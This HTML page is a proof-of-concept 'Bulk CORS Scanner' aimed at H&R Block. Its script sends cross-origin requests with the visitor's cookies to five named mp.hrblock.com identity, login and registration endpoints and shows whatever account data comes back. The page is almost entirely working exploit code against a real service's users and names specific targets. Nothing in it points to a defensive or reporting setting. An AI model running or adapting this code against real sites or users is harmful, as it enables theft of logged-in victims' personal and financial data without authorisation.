<!DOCTYPE html>
<html>
<head>
    <title>Bulk CORS Scanner - H&R Block</title>
    <style>
        body { font-family: sans-serif; padding: 20px; background-color: #1a1a1a; color: #00ff00; }
        .box { border: 1px solid #00ff00; padding: 15px; margin-bottom: 10px; background: #000; border-radius: 5px; }
        .success { color: #00ff00; font-weight: bold; }
        .failed { color: #ff0000; }
        button { padding: 10px 20px; background: #00ff00; color: #000; border: none; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>

    <h2>H&R Block - Bulk API Scanner (PoC)</h2>
    <p>Testing for Sensitive Data Leakage across multiple endpoints...</p>
    <button onclick="startScan()">Start Bulk Scan</button>
    
    <div id="results"></div>

    <script>
        // In endpoints ko hum scan karenge
        const endpoints = [
    "https://mp.hrblock.com/idl/hrb/idl",
    "https://mp.hrblock.com/idl/hrb/user",
    "https://mp.hrblock.com/idl/hrb/registration",
    "https://mp.hrblock.com/idl/hrb/spruceLogin",
    "https://mp.hrblock.com/idl/hrb/ciam_id"
];


        function startScan() {
            const resultsDiv = document.getElementById("results");
            resultsDiv.innerHTML = ""; // Clear old results

            endpoints.forEach(url => {
                var xhr = new XMLHttpRequest();
                xhr.open("GET", url, true);
                xhr.withCredentials = true; // Cookies use karne ke liye

                xhr.onreadystatechange = function() {
                    if (xhr.readyState == 4) {
                        const div = document.createElement("div");
                        div.className = "box";
                        
                        if (xhr.status == 200) {
                            div.innerHTML = `<span class="success">[FOUND] URL: ${url}</span><br>Data: ${xhr.responseText}`;
                            console.log("Success on: " + url);
                        } else {
                            div.innerHTML = `<span class="failed">[FAILED] URL: ${url}</span> (Status: ${xhr.status})`;
                        }
                        resultsDiv.appendChild(div);
                    }
                };
                xhr.send();
            });
        }
    </script>
</body>
</html>
